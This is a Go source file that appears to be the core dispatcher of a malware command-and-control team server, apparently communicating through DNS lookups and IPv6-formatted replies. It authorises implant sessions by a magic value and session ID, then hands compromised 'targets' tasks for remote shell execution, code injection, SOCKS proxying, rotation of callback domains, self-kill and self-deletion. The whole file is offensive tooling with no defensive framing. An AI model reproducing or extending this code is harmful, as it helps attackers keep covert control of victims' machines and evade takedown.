package core

import (
	"TeamServer/client"
	"TeamServer/debug"
	"TeamServer/macro"
	"TeamServer/support"
	"strconv"
	"time"
)

var LastRegistration [6]string
var LastGoustRegistration [6]string

const (
	DDMMYYYYhhmmss = "2006-01-02 15:04:05"
)

func randomIPv6() string {
	rand, _ := support.Randipv6Runes(16)
	return support.GenerateIPv6(rand)
}

type DispatcherManger struct {
	DomainName string
	AllData    string
	Task       string
	RID        int64
}

func NewDispatcher(Task string, RID int64, AllData string, DomainName string) *DispatcherManger {
	var DispatcherM = new(DispatcherManger)
	DispatcherM.DomainName = DomainName
	DispatcherM.Task = Task
	DispatcherM.RID = RID
	DispatcherM.AllData = AllData
	return DispatcherM
}

func (ds *DispatcherManger) AuthorizeSession() (bool, *macro.TargetInfo, string) {

	if len(ds.Task) < 9 {
		debug.Warn("RID [%d] Lookup length is Small!", ds.RID)
		return false, nil, ""
	}
	MagicValue := ds.Task[:3]

	if MagicValue != macro.Config.MagicValue {
		debug.Error("RID [%d] Unknow Lookup! [%s]", ds.RID, ds.Task)
		return false, nil, ""
	}

	Session := ds.Task[5:8]
	Target, ok := macro.TargetMap[Session]

	if !ok {
		debug.Warn("RID [%d] Session Not Found [%s]", ds.RID, Session)
		return false, nil, ""
	}

	if len(Target.LastMessage.LastLockup) > 0 {
		if ds.AllData == Target.LastMessage.LastLockup {
			debug.Warn("Seems the Last Message has not arrived - Resending..")
			return false, nil, Target.LastMessage.LastResponse
		}
	}

	newMassageQueue, err := strconv.Atoi(ds.Task[len(ds.Task)-1 : len(ds.Task)])
	if err != nil {
		debug.Error("retrieveRemainingData: Unable to parse MassageQueue for session [%s | ].", Target.TargetData.SessionID, Target.TargetData.HostName)
		return false, nil, ""
	}

	if Target.MassageQueue != newMassageQueue {
		debug.Warn("RID [%d] Unsynced Lookup [%s]", ds.RID, Session)
		return false, nil, ""
	}
	Target.MassageQueue++

	if Target.MassageQueue > 9 {
		Target.MassageQueue = 1
	}
	ds.Task = ds.Task[:len(ds.Task)-1]
	return true, Target, ""
}

func (ds *DispatcherManger) Dispatcher() string {

	//Verify if the target can be authorized to connect
	ok, Target, reIpv6 := ds.AuthorizeSession()
	if !ok {
		return reIpv6
	}

	TargetM := NewTargetManager(Target, ds.Task, ds.RID, ds.DomainName)
	C2Response := ""
	MessgeType := ds.Task[3:5]
	//register new session
	if MessgeType == macro.MacroRegisterCode {
		C2Response = TargetM.handleRegisterNewTarget(ds.AllData)
	} else {
		//go to session handler
		C2Response = TargetM.handleSessionRelatedTasks(ds.AllData)
	}
	if C2Response != "" {
		TargetM.Target.LastMessage.LastLockup = ds.AllData
		TargetM.Target.LastMessage.LastResponse = C2Response
	}

	return C2Response
}

func (tm *TargetManager) UpdateLastSeen() {

	dt := time.Now()
	tm.Target.TargetData.LastPing = string(dt.Format(DDMMYYYYhhmmss))
	tm.Target.TargetData.LastPing1970 = strconv.FormatInt(dt.Unix(), 10)
	client.SendUpdateLastSeen(tm.Target.TargetData)
}

func (tm *TargetManager) handleSessionRelatedTasks(AllData string) string {
	tm.UpdateLastSeen()

	switch MessgeType := tm.Data[3:5]; MessgeType {
	case macro.MacroDataEnd:
		return tm.SaveAgentResult()
	case macro.MacroRegisterRemaingCode:
		return tm.handleGoustRegistration()
	case macro.MacroAskTaskCode:
		return tm.CheckTasks()
	case macro.MacroChangeSleepCodeAT:
		return tm.SendSleepTask()
	case macro.MacroShellCodeAT:
		return tm.SendShellTask()
	case macro.MacroShellResultCodeAT:
		return tm.GetShellResult()
	case macro.MacroShellResultRemaingCodeAT:
		return tm.ShellResultRemaing()
	case macro.MacroInjectCodeAT:
		return tm.SendInjectTask()
	case macro.MacroStartProxyCodeAT:
		return tm.SendStartSocksProxyTask()
	case macro.MacroStopProxyCodeAT:
		return tm.SendStopSocksProxyTask()
	case macro.MacroNewCallBackDomainCodeAT:
		return tm.SendNewCallBackDoaminTask()
	case macro.MacroValidateDomainCodeAT:
		return tm.ValidateNewDomain()
	case macro.MacroDeleteBackDomainCodeAT:
		return tm.DeleteCallBackDomain()
	case macro.MacroValidateDeletedDomainCodeAT:
		return tm.ValidateDeletedCallBackDomain()
	case macro.MacroListAllActiveDomainCodeAT:
		return tm.ListAllActiveDomains()
	case macro.MacroKillAT:
		return tm.SendSelfKillTask()
	case macro.MacroSelfDelAT:
		return tm.SendSelfDelTask()

	default:
		debug.Error("RID [%d] Unknown Task code", tm.RID)
	}
	debug.Error("RID [%d] Task code Not Found!", tm.RID)
	return ""
}
